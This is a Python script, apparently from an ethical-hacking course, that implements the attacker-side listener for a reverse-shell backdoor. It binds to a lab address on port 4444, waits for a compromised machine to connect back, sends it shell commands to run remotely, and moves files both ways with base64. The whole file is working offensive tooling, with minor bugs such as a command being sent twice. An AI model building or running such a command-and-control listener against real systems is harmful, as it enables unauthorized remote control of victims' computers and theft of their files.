#!/usr/bin/env python

import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # setting connection type to sock stream (creates tcp connection)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # modifies the address option to a value of 1
        # enables option that allows us to reuse sockets
        listener.bind(((ip, port)))  # binds socket to computer
        listener.listen(0)  # listens to all the connections coming to this port
        print("[...] Waiting for incoming connections [...]")
        self.connection, address = listener.accept()  # tells computer to accept connection to port
        # captures two vaules returned by listener.accept method:
        # first is new socket object the represents connecection (what we're using to send and recieve data)
        # second is the address bound to socket
        print("[+] Got a connection from {addr}" + str(address))  # lets user know that a connection has been established

    def reliable_send(self, data):
        json_data = json.dumps(data)  # converts data to json object
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""  # gives variable starting value
        while True:  # creates infinite loop
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)  # unwraps data passed as json object
            except ValueError:  # if there's a value error it retarts the loop
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()  # exits out of the listener and backdoor if command is exit
        self.reliable_send(command)  # sends command as data (will execute on target comp and return result)
        return self.reliable_receive()  # storing data result in result variable

    def write_file(self, path, content):
        with open(path, "wb") as file:  # opens file path using write binary method
            file.write(base64.b64decode(content))  # decodes file once passed over
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input("[+] Enter command >> ")  # command varaible holds command entered by user
            # tells user to input command
            command = command.split(" ")  # splits command based on spaces

            try:
                if command[0] == "upload":  # checks if first commmand is upload
                    file_content = self.read_file(command[1])  # read file and store the contents in variable
                    command.append(file_content)  # appends variable as extra element to command list and sent to backdoor
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)  # executes write file and prints on screen for person using listener
            except Exception:
                result = "[-] Error during command execution"

            print(result)

my_listener = Listener("10.0.2.15", 4444)
my_listener.run()